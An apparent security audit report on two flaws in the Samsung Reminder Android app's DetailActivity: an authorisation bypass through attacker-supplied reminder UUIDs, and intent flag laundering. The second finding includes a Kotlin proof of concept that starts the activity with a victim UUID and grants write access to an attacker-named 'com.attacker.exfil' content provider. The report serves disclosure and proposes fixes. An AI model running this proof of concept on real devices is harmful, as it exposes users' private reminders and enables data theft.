## [V-002] DetailActivity â€” UUID Trust Boundary: Arbitrary Reminder Access via `RepositoryHolder.getReminderRepository().s(uuid, â€¦)`

**File:** `sources/com/samsung/android/app/reminder/ui/detail/view/DetailActivity.java`, line 81.
**Severity:** Medium-High (information disclosure + state tampering).
**Class of flaw:** CWE-639 â€” Authorisation bypass through user-controlled key (IDOR).

### Summary
After parsing the UUID from the URI / extras, `DetailActivity` calls:
```java
((U) RepositoryHolder.INSTANCE.getReminderRepository()).s(stringExtra, <successCb>, <failCb>);
```
`stringExtra` is fully attacker-controlled (URI last path segment or query parameter or bare extra). The success callback mutates `getIntent().putExtra("add_view_type", q.a(reminder, 1));` â€” i.e. the returned reminder object's state (type) is reflected back into the intent that will eventually start `AddActivity`.

### Attacker impact
* An attacker can enumerate / brute-force reminder UUIDs (v4 UUIDs are unguessable in practice, but UUIDs leak through the searchable provider, shared intents, and the `content://` deeplink) and force `DetailActivity â†’ AddActivity` to load them, exposing the reminder's content to the attacker's subsequent activity (e.g. by racing the activity transition or by observing side-channels such as `TaskInfo`/`ActivityManager` or by chaining with a second exported activity that reads the same intent).
* Combined with V-001, any UUID can be targeted **without** holding the REGISTER permission.

### PoC
See V-001 PoC â€” the `uuid` extra/path segment drives repository lookup.

### Fix
`reminderRepository.s(uuid, â€¦)` must verify that the calling identity is authorised for the reminder (e.g. `Binder.getCallingUid()` check, or simply require the REGISTER permission on `DetailActivity` itself).

---

## [V-003] DetailActivity â€” Intent Flag Laundering Enables Cross-User/Task Hijack

**File:** `sources/com/samsung/android/app/reminder/ui/detail/view/DetailActivity.java`, lines 98â€“107.
**Severity:** Medium.

### Summary
The branch at line 98:
```java
if (zD || zD2) {
    setIntent(y0.a(getApplicationContext(), getIntent()));
    getApplicationContext().startActivity(getIntent());
}
```
is taken when `data.getHost() == "viewdetail"` or query `fromBrief=true`. The attacker trivially triggers this by sending `reminder://viewdetail/?fromBrief=true`. `startActivity` is invoked on the **application context**, forcing `FLAG_ACTIVITY_NEW_TASK`, and the Intent object â€” including any `FLAG_GRANT_READ/WRITE_URI_PERMISSION` bits and arbitrary `ClipData` â€” is preserved.

### Attacker abuse
* Attacker supplies a `content://attacker.authority/secret` `ClipData` with `FLAG_GRANT_WRITE_URI_PERMISSION`. `AddActivity` (or downstream) will then hold temporary write access to the attacker-controlled provider, enabling logging exfiltration or data injection.
* Attacker can also stack `FLAG_ACTIVITY_CLEAR_TASK | FLAG_ACTIVITY_NEW_TASK | FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS` so that the spawned `AddActivity` runs in a hidden, attacker-owned task â€” hiding the malicious activity from the user's recents.

### PoC
```kotlin
val i = Intent(Intent.ACTION_VIEW).apply {
    setClassName("com.samsung.android.app.reminder",
        "com.samsung.android.app.reminder.ui.detail.view.DetailActivity")
    data = Uri.parse("reminder://viewdetail/?fromBrief=true&uuid=$victimUuid")
    clipData = ClipData.newRawUri("c",
        Uri.parse("content://com.attacker.exfil/steal"))
    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or
             Intent.FLAG_GRANT_WRITE_URI_PERMISSION or
             Intent.FLAG_ACTIVITY_CLEAR_TASK or
             Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS)
}
startActivity(i)
```

### Fix
Rebuild the forwarded Intent with a clean flag-set; strip `FLAG_GRANT_*` and validate ClipData before propagating.

---

_End of findings for DetailActivity (first iteration)_

